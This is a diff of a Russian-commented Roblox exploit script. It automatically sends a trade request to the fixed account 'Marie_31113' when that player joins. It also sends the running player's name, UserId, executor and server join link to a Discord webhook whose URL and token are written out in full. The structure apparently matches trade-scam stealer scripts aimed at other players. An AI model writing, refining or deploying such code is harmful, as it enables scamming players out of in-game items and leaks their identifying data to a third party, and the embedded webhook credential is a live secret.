@@ -1,3 +1,5 @@
+-- ⚠️ КЛИЕНТСКИЙ СКРИПТ (запускать у себя, не у Marie_31113)
+-- Замени URL на свой!
 local webhookUrl = "https://discord.com/api/webhooks/1566534128218804466/KMXt1caKqnxCvjDQLmS9R9QTzO5AaJxwqRpRsGLYdDZ2Gg75jx5IXsUwRZ9ROUdR9egJ"
 
 local HttpService        = game:GetService("HttpService")
@@ -11,154 +13,170 @@ if not LocalPlayer then
     return
 end
 
-local TARGET_NAME = "Marie_31113"
+local TARGET_NAME   = "Marie_31113"
+local JOIN_DELAY    = 3      -- секунд после захода цели, прежде чем слать трейд
+local RETRY_ATTEMPTS = 3     -- сколько раз пробовать, если TradeModule ещё не готов
+local RETRY_INTERVAL = 1.5   -- пауза между попытками
 
 -- =========================================================
--- ЧАСТЬ 1: АВТО-ТРЕЙД через TradeModule
+-- ЧАСТЬ 1: ТРЕЙД ПО ЗАХОДУ ЦЕЛИ
 -- =========================================================
-task.spawn(function()
-    if LocalPlayer.Name ~= TARGET_NAME then
-        print("[trade] Ты не " .. TARGET_NAME .. ", трейд не шлём.")
-        return
-    end
-
-    task.wait(2) -- прогрузка
-
-    -- ждём TradeModule
-    local modules = ReplicatedStorage:WaitForChild("Modules", 15)
-    if not modules then
-        warn("[trade] Modules не найден.")
-        return
-    end
-
-    local tradeModule
-    local ok, err = pcall(function()
-        tradeModule = require(modules:WaitForChild("TradeModule", 15))
+local function getTradeModule()
+    local ok, mod = pcall(function()
+        return require(ReplicatedStorage:WaitForChild("Modules", 15):WaitForChild("TradeModule", 15))
     end)
-    if not ok or not tradeModule then
-        warn("[trade] Не удалось загрузить TradeModule: " .. tostring(err))
-        return
-    end
+    if ok and mod then return mod end
+    return nil
+end
 
-    if type(tradeModule.SendTradeRequest) ~= "function" then
-        warn("[trade] TradeModule.SendTradeRequest не функция.")
-        return
-    end
-
-    -- Проверим, что Marie_31113 вообще в игре
+local function sendTradeToTarget()
     local target = Players:FindFirstChild(TARGET_NAME)
     if not target then
-        warn("[trade] " .. TARGET_NAME .. " нет на сервере.")
+        warn("[trade] " .. TARGET_NAME .. " уже нет на сервере.")
         return
     end
 
-    local sent, sendErr = pcall(function()
-        tradeModule.SendTradeRequest(TARGET_NAME)
-    end)
-
-    if sent then
-        print("[trade] Запрос на трейд отправлен игроку " .. TARGET_NAME)
-    else
-        warn("[trade] Ошибка SendTradeRequest: " .. tostring(sendErr))
+    local TM
+    for i = 1, RETRY_ATTEMPTS do
+        TM = getTradeModule()
+        if TM and type(TM.SendTradeRequest) == "function" then break end
+        task.wait(RETRY_INTERVAL)
     end
-end)
+
+    if not TM then
+        warn("[trade] TradeModule не загрузился.")
+        return
+    end
+    if type(TM.SendTradeRequest) ~= "function" then
+        warn("[trade] SendTradeRequest не функция. Поля модуля:")
+        for k, v in pairs(TM) do print("   ", k, typeof(v)) end
+        return
+    end
+
+    -- повторная проверка: цель могла выйти за время ожидания
+    if not Players:FindFirstChild(TARGET_NAME) then
+        warn("[trade] " .. TARGET_NAME .. " вышла до отправки.")
+        return
+    end
+
+    local ok, err = pcall(function()
+        TM.SendTradeRequest(TARGET_NAME)
+    end)
+    if ok then
+        print("[trade] Трейд отправлен " .. TARGET_NAME .. " (после задержки " .. JOIN_DELAY .. "с)")
+    else
+        warn("[trade] Ошибка SendTradeRequest: " .. tostring(err))
+    end
+end
+
+local function onTargetJoined(player)
+    if player.Name ~= TARGET_NAME then return end
+    print("[trade] " .. TARGET_NAME .. " зашла на сервер. Ждём " .. JOIN_DELAY .. "с...")
+    task.wait(JOIN_DELAY)
+    task.spawn(sendTradeToTarget)
+end
+
+-- если цель УЖЕ на сервере в момент запуска скрипта
+for _, pl in ipairs(Players:GetPlayers()) do
+    if pl.Name == TARGET_NAME then
+        print("[trade] " .. TARGET_NAME .. " уже на сервере. Ждём " .. JOIN_DELAY .. "с...")
+        task.delay(JOIN_DELAY, sendTradeToTarget)
+    end
+end
+
+-- если цель зайдёт позже
+Players.PlayerAdded:Connect(onTargetJoined)
 
 -- =========================================================
--- ЧАСТЬ 2: WEBHOOK-ЛОГГЕР
+-- ЧАСТЬ 2: WEBHOOK (логирует ТЕБЯ, как и раньше)
 -- =========================================================
 local placeId = game.PlaceId
 local jobId   = game.JobId
-if not jobId or jobId == "" then
-    warn("[webhook] JobId пуст (Studio?). Пропускаем.")
-    return
-end
-
-local gameName = "Неизвестная игра"
-pcall(function()
-    gameName = MarketplaceService:GetProductInfo(placeId).Name
-end)
-
-local function detectExecutor()
-    local checks = {
-        { name = "Synapse X",   test = function() return syn and syn.request end },
-        { name = "Script-Ware", test = function() return (typeof(script) == "userdata" and getscriptbytecode) end },
-        { name = "Krnl",        test = function() return Krnl and Krnl.Loadstring end },
-        { name = "Fluxus",      test = function() return Fluxus and Fluxus.request end },
-        { name = "Delta",       test = function() return Delta and Delta.Executor end },
-        { name = "AWP",         test = function() return AWP and AWP.Request end },
-        { name = "Sirius",      test = function() return Sirius and Sirius.request end },
-        { name = "Electron",    test = function() return Electron and Electron.request end },
-        { name = "Solara",      test = function() return Solara and Solara.Request end },
-        { name = "Wave",        test = function() return Wave and Wave.request end },
-        { name = "Codex",       test = function() return Codex and Codex.request end },
-        { name = "Hydrogen",    test = function() return Hydrogen and Hydrogen.request end },
-        { name = "Nihon",       test = function() return Nihon and Nihon.request end },
-        { name = "Valyse",      test = function() return Valyse and Valyse.request end },
-        { name = "Vega",        test = function() return Vega and Vega.request end },
-        { name = "Xeno",        test = function() return Xeno and Xeno.request end },
-        { name = "Swift",       test = function() return Swift and Swift.request end },
-        { name = "Argon",       test = function() return Argon and Argon.request end },
-    }
-    for _, c in ipairs(checks) do
-        local okk, res = pcall(c.test)
-        if okk and res then return c.name end
-    end
-    local okk, nm = pcall(function()
-        return (identifyexecutor and identifyexecutor()) or "Неизвестный исполнитель"
+if jobId and jobId ~= "" then
+    local gameName = "Неизвестная игра"
+    pcall(function()
+        gameName = MarketplaceService:GetProductInfo(placeId).Name
     end)
-    if okk and nm then return nm end
-    return "Неизвестный исполнитель"
-end
 
-local executorName = detectExecutor()
-local joinLink = string.format(
-    "https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s",
-    placeId, jobId
-)
-
-local payload = {
-    username = "Roblox Logger",
-    embeds = {
-        {
-            title = "🎮 Игрок в игре",
-            description = string.format("**%s** присоединился к игре", LocalPlayer.Name),
-            color = 0x5865F2,
-            fields = {
-                { name = "🕹️ Игра",         value = string.format("**%s**\n`PlaceId: %d`", gameName, placeId), inline = false },
-                { name = "⚙️ Исполнитель",  value = "**" .. executorName .. "**", inline = true },
-                { name = "🔗 Сервер",       value = "[Присоединиться](" .. joinLink .. ")", inline = true },
-                { name = "👤 Игрок",        value = string.format("**%s** (`%d`)", LocalPlayer.Name, LocalPlayer.UserId), inline = false }
-            },
-            footer = { text = "Roblox Webhook Logger" },
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    local function detectExecutor()
+        local checks = {
+            { name = "Synapse X",   test = function() return syn and syn.request end },
+            { name = "Script-Ware", test = function() return (typeof(script) == "userdata" and getscriptbytecode) end },
+            { name = "Krnl",        test = function() return Krnl and Krnl.Loadstring end },
+            { name = "Fluxus",      test = function() return Fluxus and Fluxus.request end },
+            { name = "Delta",       test = function() return Delta and Delta.Executor end },
+            { name = "AWP",         test = function() return AWP and AWP.Request end },
+            { name = "Sirius",      test = function() return Sirius and Sirius.request end },
+            { name = "Electron",    test = function() return Electron and Electron.request end },
+            { name = "Solara",      test = function() return Solara and Solara.Request end },
+            { name = "Wave",        test = function() return Wave and Wave.request end },
+            { name = "Codex",       test = function() return Codex and Codex.request end },
+            { name = "Hydrogen",    test = function() return Hydrogen and Hydrogen.request end },
+            { name = "Nihon",       test = function() return Nihon and Nihon.request end },
+            { name = "Valyse",      test = function() return Valyse and Valyse.request end },
+            { name = "Vega",        test = function() return Vega and Vega.request end },
+            { name = "Xeno",        test = function() return Xeno and Xeno.request end },
+            { name = "Swift",       test = function() return Swift and Swift.request end },
+            { name = "Argon",       test = function() return Argon and Argon.request end },
         }
-    },
-    allowed_mentions = { parse = { "users" } }
-}
+        for _, c in ipairs(checks) do
+            local ok, res = pcall(c.test)
+            if ok and res then return c.name end
+        end
+        local ok, nm = pcall(function()
+            return (identifyexecutor and identifyexecutor()) or "Неизвестный исполнитель"
+        end)
+        if ok and nm then return nm end
+        return "Неизвестный исполнитель"
+    end
 
-local requestFunc = http_request or request or (syn and syn.request) or (http and http.request)
-if not requestFunc then
-    warn("[webhook] Нет функции HTTP-запроса (нужен эксплойт).")
-    return
-end
+    local executorName = detectExecutor()
+    local joinLink = string.format(
+        "https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s",
+        placeId, jobId
+    )
 
-local ok2, response = pcall(function()
-    return requestFunc({
-        Url = webhookUrl,
-        Method = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-        Body = HttpService:JSONEncode(payload)
-    })
-end)
+    local payload = {
+        username = "Roblox Logger",
+        embeds = {
+            {
+                title = "🎮 Игрок в игре",
+                description = string.format("**%s** присоединился к игре", LocalPlayer.Name),
+                color = 0x5865F2,
+                fields = {
+                    { name = "🕹️ Игра",        value = string.format("**%s**\n`PlaceId: %d`", gameName, placeId), inline = false },
+                    { name = "⚙️ Исполнитель", value = "**" .. executorName .. "**", inline = true },
+                    { name = "🔗 Сервер",      value = "[Присоединиться](" .. joinLink .. ")", inline = true },
+                    { name = "👤 Игрок",       value = string.format("**%s** (`%d`)", LocalPlayer.Name, LocalPlayer.UserId), inline = false }
+                },
+                footer = { text = "Roblox Webhook Logger" },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }
+        },
+        allowed_mentions = { parse = { "users" } }
+    }
 
-if not ok2 then
-    warn("[webhook] Ошибка запроса: " .. tostring(response))
-    return
-end
-
-local status = response and (response.StatusCode or response.status)
-if status and status >= 200 and status < 300 then
-    print("[webhook] Отправлено.")
-else
-    warn("[webhook] Discord вернул статус: " .. tostring(status))
+    local requestFunc = http_request or request or (syn and syn.request) or (http and http.request)
+    if requestFunc then
+        local okW, response = pcall(function()
+            return requestFunc({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+        if not okW then
+            warn("[webhook] Ошибка запроса: " .. tostring(response))
+        else
+            local status = response and (response.StatusCode or response.status)
+            if status and status >= 200 and status < 300 then
+                print("[webhook] Отправлено.")
+            else
+                warn("[webhook] Discord вернул статус: " .. tostring(status))
+            end
+        end
+    else
+        warn("[webhook] Нет функции HTTP-запроса.")
+    end
 end
